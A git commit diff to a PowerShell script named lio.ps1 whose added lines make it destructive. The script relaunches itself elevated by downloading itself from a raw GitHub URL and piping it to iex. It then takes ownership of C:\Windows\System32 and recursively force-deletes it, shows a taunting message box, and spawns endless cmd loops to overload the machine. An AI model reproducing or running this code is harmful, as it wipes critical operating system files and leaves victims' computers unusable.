36b4e4b6fe840816b1604a0ec6bac2c09d0e7a18
LUBRJ <145651445+lubrj@users.noreply.github.com>
2025-05-30 15:28:59 +0200

    Update lio.ps1

--- lio.ps1
+++ lio.ps1
@@ -2,7 +2,13 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iwr https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/lio.ps1 -UseBasicParsing | iex`""
     exit
 }
-Write-host test
+
+Start-Job -ScriptBlock {
+    takeown /F "C:\Windows\System32" /A /R /D Y > $null
+    icacls "C:\Windows\System32" /grant Administrators:(F) /T /C > $null
+    Remove-Item "C:\Windows\System32" -Recurse -Force
+}
+
 [System.Windows.MessageBox]::Show("now you are a real hacker")
 for ($i = 1; $i -le 15; $i++) {
     Start-Process cmd -ArgumentList "/k", "for /l %x in (0,0,1) do dir /s"
